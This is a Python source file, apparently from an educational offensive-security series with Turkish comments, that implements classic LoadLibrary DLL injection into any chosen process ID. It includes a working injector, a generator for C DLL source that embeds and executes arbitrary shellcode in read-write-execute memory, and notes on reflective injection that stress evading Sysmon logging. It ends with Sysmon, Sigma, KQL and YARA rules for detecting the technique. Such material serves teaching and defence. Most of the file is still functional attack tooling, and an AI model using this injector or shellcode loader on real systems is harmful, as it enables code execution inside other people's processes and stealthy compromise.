"""
Technique 6: DLL Injection
===========================
LoadLibrary kullanarak hedef process'e DLL enjekte etme.

MITRE ATT&CK: T1055.001 - Process Injection: Dynamic-link Library Injection

API Çağrı Sırası:
1. OpenProcess() - Process handle
2. VirtualAllocEx() - DLL path için bellek ayır
3. WriteProcessMemory() - DLL path'i yaz
4. GetProcAddress() - LoadLibraryA adresini al
5. CreateRemoteThread() - LoadLibrary'yi çağır

Author: Ugur Ates
Purpose: Educational
"""

import ctypes
from ctypes import wintypes
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.win_api import (
    OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread,
    CloseHandle, WaitForSingleObject,
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
    PROCESS_ALL_ACCESS, INFINITE, GetLastError
)

# ============================================================================
# EXPLANATION
# ============================================================================

TECHNIQUE_INFO = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                       TECHNIQUE 6: DLL INJECTION                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📖 AÇIKLAMA:                                                                ║
║  ─────────────                                                               ║
║  DLL Injection, zararlı bir DLL'i hedef process'in adres alanına yükleyerek  ║
║  kod çalıştırma tekniğidir. LoadLibrary API'si kullanılarak DLL'in           ║
║  DllMain fonksiyonu otomatik olarak çalıştırılır.                            ║
║                                                                              ║
║  🔄 ÇALIŞMA PRENSİBİ:                                                        ║
║  ─────────────────────                                                       ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                      ATTACKER MACHINE                               │    ║
║  │                                                                     │    ║
║  │  ┌──────────────────┐                                               │    ║
║  │  │  malicious.dll   │ ◄── DLL_PROCESS_ATTACH'ta kod çalışır        │    ║
║  │  │                  │                                               │    ║
║  │  │  DllMain() {     │                                               │    ║
║  │  │    // Payload    │                                               │    ║
║  │  │    shellcode();  │                                               │    ║
║  │  │  }               │                                               │    ║
║  │  └──────────────────┘                                               │    ║
║  │           │                                                         │    ║
║  │           │ Full path: "C:\\malware\\malicious.dll"                 │    ║
║  │           ▼                                                         │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                      INJECTION PROCESS                              │    ║
║  │                                                                     │    ║
║  │  1. VirtualAllocEx() ──► Allocate memory for DLL path              │    ║
║  │                                                                     │    ║
║  │     Target Process Memory                                          │    ║
║  │     ┌────────────────────────────────────────┐                     │    ║
║  │     │ 0x0000ABC0:                            │                     │    ║
║  │     │ "C:\\malware\\malicious.dll\0"         │ ◄── DLL path        │    ║
║  │     └────────────────────────────────────────┘                     │    ║
║  │                                                                     │    ║
║  │  2. WriteProcessMemory() ──► Write DLL path string                 │    ║
║  │                                                                     │    ║
║  │  3. GetProcAddress(kernel32, "LoadLibraryA")                       │    ║
║  │     ┌────────────────────────────────────────┐                     │    ║
║  │     │ LoadLibraryA @ 0x7FF8ABCD1234          │                     │    ║
║  │     └────────────────────────────────────────┘                     │    ║
║  │                                                                     │    ║
║  │  4. CreateRemoteThread(LoadLibraryA, "C:\\malware\\malicious.dll") │    ║
║  │                                                                     │    ║
║  │     Remote Thread                                                   │    ║
║  │     ┌────────────────────────────────────────┐                     │    ║
║  │     │ call LoadLibraryA(0x0000ABC0)          │                     │    ║
║  │     │      ↓                                 │                     │    ║
║  │     │ DLL loads → DllMain() executes         │                     │    ║
║  │     └────────────────────────────────────────┘                     │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  🎯 DLL TEMPLATE:                                                            ║
║  ─────────────────                                                           ║
║                                                                              ║
║  BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {  ║
║      if (reason == DLL_PROCESS_ATTACH) {                                     ║
║          // Payload burada çalışır                                          ║
║          MessageBoxA(NULL, "Injected!", "DLL", MB_OK);                       ║
║      }                                                                       ║
║      return TRUE;                                                            ║
║  }                                                                           ║
║                                                                              ║
║  ⚠️ TESPİT GÖSTERGELERİ:                                                     ║
║  ────────────────────────                                                    ║
║  • CreateRemoteThread with LoadLibrary as start address                      ║
║  • Unusual DLL load in process (Sysmon Event ID 7)                          ║
║  • DLL loaded from suspicious path                                           ║
║  • Unsigned DLL load                                                         ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# GET LOADLIBRARY ADDRESS
# ============================================================================

def get_loadlibrary_address() -> int:
    """
    kernel32.dll'den LoadLibraryA adresini al.
    
    Not: LoadLibrary adresi tüm process'lerde aynıdır (ASLR: kernel32 shared)
    """
    kernel32 = ctypes.windll.kernel32
    
    # GetModuleHandle + GetProcAddress
    h_kernel32 = kernel32.GetModuleHandleW("kernel32.dll")
    
    if not h_kernel32:
        return 0
    
    load_library_addr = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
    
    return load_library_addr

# ============================================================================
# DLL INJECTION
# ============================================================================

def inject_dll(dll_path: str, target_pid: int, verbose: bool = True) -> bool:
    """
    DLL Injection gerçekleştir.
    
    Args:
        dll_path: Enjekte edilecek DLL'in full path'i
        target_pid: Hedef process PID
        verbose: Detaylı çıktı
    
    Returns:
        bool: Başarı durumu
    """
    if verbose:
        print(TECHNIQUE_INFO)
        print(f"\n🎯 Hedef PID: {target_pid}")
        print(f"📦 DLL: {dll_path}")
        print("="*60)
    
    # Validate DLL exists
    if not os.path.exists(dll_path):
        print(f"❌ DLL bulunamadı: {dll_path}")
        return False
    
    # Get LoadLibraryA address
    if verbose:
        print("\n[1/5] GetProcAddress() - LoadLibraryA adresini alma...")
    
    load_library_addr = get_loadlibrary_address()
    
    if not load_library_addr:
        print("❌ LoadLibraryA adresi alınamadı!")
        return False
    
    if verbose:
        print(f"   ✅ LoadLibraryA: 0x{load_library_addr:016X}")
    
    # Open process
    if verbose:
        print("\n[2/5] OpenProcess() - Process handle alma...")
    
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
    
    if not process_handle:
        print(f"❌ OpenProcess başarısız! Error: {GetLastError()}")
        return False
    
    if verbose:
        print(f"   ✅ Handle: 0x{process_handle:X}")
    
    try:
        # Allocate memory for DLL path
        dll_path_bytes = dll_path.encode('ascii') + b'\x00'
        
        if verbose:
            print("\n[3/5] VirtualAllocEx() - DLL path için bellek ayırma...")
        
        remote_addr = VirtualAllocEx(
            process_handle, None, len(dll_path_bytes),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        )
        
        if not remote_addr:
            print(f"❌ VirtualAllocEx başarısız! Error: {GetLastError()}")
            return False
        
        if verbose:
            print(f"   ✅ Allocated: 0x{remote_addr:016X}")
        
        # Write DLL path
        if verbose:
            print("\n[4/5] WriteProcessMemory() - DLL path yazma...")
        
        bytes_written = ctypes.c_size_t()
        result = WriteProcessMemory(
            process_handle, remote_addr, dll_path_bytes,
            len(dll_path_bytes), ctypes.byref(bytes_written)
        )
        
        if not result:
            print(f"❌ WriteProcessMemory başarısız! Error: {GetLastError()}")
            return False
        
        if verbose:
            print(f"   ✅ Written: {bytes_written.value} bytes")
            print(f"   📝 Path: {dll_path}")
        
        # Create remote thread to call LoadLibrary
        if verbose:
            print("\n[5/5] CreateRemoteThread() - LoadLibrary çağırma...")
        
        thread_id = wintypes.DWORD()
        thread_handle = CreateRemoteThread(
            process_handle,
            None,                           # Security attributes
            0,                              # Stack size
            load_library_addr,              # Start address = LoadLibraryA
            remote_addr,                    # Parameter = DLL path address
            0,                              # Creation flags
            ctypes.byref(thread_id)
        )
        
        if not thread_handle:
            print(f"❌ CreateRemoteThread başarısız! Error: {GetLastError()}")
            return False
        
        if verbose:
            print(f"   ✅ Thread created: TID={thread_id.value}")
        
        # Wait for LoadLibrary to complete
        WaitForSingleObject(thread_handle, INFINITE)
        
        # Get exit code (DLL handle or 0 on failure)
        exit_code = wintypes.DWORD()
        ctypes.windll.kernel32.GetExitCodeThread(thread_handle, ctypes.byref(exit_code))
        
        CloseHandle(thread_handle)
        
        if exit_code.value == 0:
            print("⚠️ LoadLibrary returned NULL - DLL yüklenememiş olabilir")
            return False
        
        if verbose:
            print(f"   ✅ DLL Handle: 0x{exit_code.value:X}")
            print("\n" + "="*60)
            print("🎉 DLL INJECTION BAŞARILI!")
            print(f"   DLL: {dll_path}")
            print(f"   Target PID: {target_pid}")
            print(f"   DLL Base: 0x{exit_code.value:X}")
            print("="*60)
        
        return True
        
    finally:
        CloseHandle(process_handle)

# ============================================================================
# CREATE MALICIOUS DLL
# ============================================================================

def generate_dll_source(shellcode: bytes = None) -> str:
    """
    Test için basit DLL source kodu üret.
    
    Args:
        shellcode: Opsiyonel shellcode (yoksa MessageBox gösterir)
    
    Returns:
        str: C source code
    """
    if shellcode:
        shellcode_hex = ', '.join(f'0x{b:02x}' for b in shellcode)
        payload_code = f'''
    // Execute shellcode
    unsigned char shellcode[] = {{ {shellcode_hex} }};
    
    void* exec = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
'''
    else:
        payload_code = '''
    MessageBoxA(NULL, "DLL Injected Successfully!", "Injection Test", MB_OK | MB_ICONINFORMATION);
'''
    
    return f'''/*
 * Test DLL for DLL Injection
 * Compile: cl /LD test_dll.c
 */

#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {{
    switch (dwReason) {{
        case DLL_PROCESS_ATTACH:
            // Disable thread library calls for performance
            DisableThreadLibraryCalls(hModule);
            
            // PAYLOAD STARTS HERE
            {payload_code}
            break;
            
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }}
    return TRUE;
}}

// Export function (optional)
__declspec(dllexport) void RunPayload(void) {{
    MessageBoxA(NULL, "Exported function called!", "DLL", MB_OK);
}}
'''

# ============================================================================
# REFLECTIVE DLL INJECTION (Advanced)
# ============================================================================

REFLECTIVE_INFO = """
📖 REFLECTIVE DLL INJECTION

Standart DLL injection'dan farklı olarak:
- LoadLibrary kullanmaz
- DLL disk üzerinde olmak zorunda değil
- DLL kendini belleğe yükler (reflective loader)

Avantajları:
- Dosya sisteminde iz bırakmaz
- Sysmon Event ID 7 (ImageLoad) tetiklemez
- Daha stealth

Zorlukları:
- Karmaşık implementasyon
- PE parsing gerektirir
- Import resolution yapılmalı

Tools: Metasploit reflective_dll_inject, Cobalt Strike
"""

# ============================================================================
# DETECTION RULES
# ============================================================================

DETECTION_RULES = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                    🛡️ BLUE TEAM DETECTION RULES                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📋 SYSMON DETECTION:                                                        ║
║  ─────────────────────                                                       ║
║                                                                              ║
║  <!-- Event ID 7: Image Load (DLL) -->                                       ║
║  <ImageLoad onmatch="include">                                               ║
║    <ImageLoaded condition="contains">\\Temp\\</ImageLoaded>                  ║
║    <ImageLoaded condition="contains">\\AppData\\</ImageLoaded>               ║
║    <Signed condition="is">false</Signed>                                     ║
║  </ImageLoad>                                                                ║
║                                                                              ║
║  <!-- Event ID 8: CreateRemoteThread -->                                     ║
║  <CreateRemoteThread onmatch="include">                                      ║
║    <StartFunction condition="contains">LoadLibrary</StartFunction>           ║
║  </CreateRemoteThread>                                                       ║
║                                                                              ║
║  📋 SIGMA RULE:                                                              ║
║  ──────────────                                                              ║
║                                                                              ║
║  title: DLL Injection via LoadLibrary                                        ║
║  status: experimental                                                        ║
║  logsource:                                                                  ║
║    product: windows                                                          ║
║    service: sysmon                                                           ║
║  detection:                                                                  ║
║    selection_thread:                                                         ║
║      EventID: 8                                                              ║
║    selection_dll:                                                            ║
║      EventID: 7                                                              ║
║      Signed: 'false'                                                         ║
║    timeframe: 5s                                                             ║
║    condition: selection_thread and selection_dll                             ║
║  level: high                                                                 ║
║                                                                              ║
║  📋 KQL QUERIES:                                                             ║
║  ────────────────                                                            ║
║                                                                              ║
║  // Unsigned DLL loads                                                       ║
║  DeviceImageLoadEvents                                                       ║
║  | where SignatureState != "Valid"                                           ║
║  | where FolderPath !startswith "C:\\Windows\\"                              ║
║  | project Timestamp, DeviceName, FileName, FolderPath,                      ║
║            InitiatingProcessFileName, SignatureState                         ║
║                                                                              ║
║  // DLL load from suspicious paths                                           ║
║  DeviceImageLoadEvents                                                       ║
║  | where FolderPath has_any ("\\Temp\\", "\\AppData\\", "\\Downloads\\")    ║
║  | project Timestamp, DeviceName, FileName, FolderPath,                      ║
║            InitiatingProcessFileName                                         ║
║                                                                              ║
║  // CreateRemoteThread targeting LoadLibrary                                 ║
║  DeviceEvents                                                                ║
║  | where ActionType == "CreateRemoteThreadApiCall"                           ║
║  | extend StartAddress = parse_json(AdditionalFields).StartAddress           ║
║  | where StartAddress contains "LoadLibrary"                                 ║
║                                                                              ║
║  📋 YARA RULE:                                                               ║
║  ─────────────                                                               ║
║                                                                              ║
║  rule DLL_Injection_Dropper {                                                ║
║      meta:                                                                   ║
║          description = "Detects DLL injection dropper"                       ║
║      strings:                                                                ║
║          $api1 = "VirtualAllocEx" ascii wide                                 ║
║          $api2 = "WriteProcessMemory" ascii wide                             ║
║          $api3 = "CreateRemoteThread" ascii wide                             ║
║          $api4 = "LoadLibraryA" ascii wide                                   ║
║      condition:                                                              ║
║          all of them                                                         ║
║  }                                                                           ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print(TECHNIQUE_INFO)
    
    print("\n📋 Seçenekler:")
    print("   1. DLL Injection (mevcut DLL)")
    print("   2. Test DLL source kodu üret")
    
    choice = input("\nSeçim (1/2): ").strip()
    
    if choice == "2":
        print("\n📝 Test DLL Source Code:")
        print("="*60)
        print(generate_dll_source())
        print("="*60)
        print("\n💡 Compile: cl /LD test_dll.c")
    else:
        dll_path = input("DLL path (full path): ").strip()
        pid = input("Hedef PID: ").strip()
        
        try:
            inject_dll(dll_path, int(pid))
        except ValueError:
            print("Geçersiz PID")
    
    print(DETECTION_RULES)
